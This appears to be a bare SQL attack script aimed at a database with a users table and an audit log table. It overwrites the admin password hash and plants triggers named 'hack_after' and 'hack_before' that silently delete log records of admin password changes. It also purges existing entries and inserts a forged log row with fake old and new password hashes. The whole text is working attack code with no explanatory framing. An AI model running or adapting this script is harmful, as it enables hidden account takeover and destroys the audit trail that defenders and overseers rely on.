UPDATE users SET "password" = "982c0381c279d139fd221fce974916e7"
WHERE "username" = "admin";

CREATE TRIGGER "hack_after"
AFTER UPDATE OF "password" ON users
FOR EACH ROW
BEGIN
    DELETE FROM user_logs
    WHERE "old_username" = "admin" AND "new_username" = "admin" AND "type" = "update";
END;

CREATE TRIGGER "hack_before"
BEFORE UPDATE OF "password" ON users
FOR EACH ROW
BEGIN
    DELETE FROM user_logs
    WHERE "old_username" = "admin" AND "new_username" = "admin" AND "type" = "update";
END;

DELETE FROM user_logs
WHERE "old_username" = "admin" AND "new_username" = "admin" AND "type" = "update";

INSERT INTO user_logs("type","old_username","new_username","old_password","new_password")
VALUES ("update", "admin", "admin", "e10adc3949ba59abbe56e057f20f883e", "44bf025d27eea66336e5c1133c3827f7")
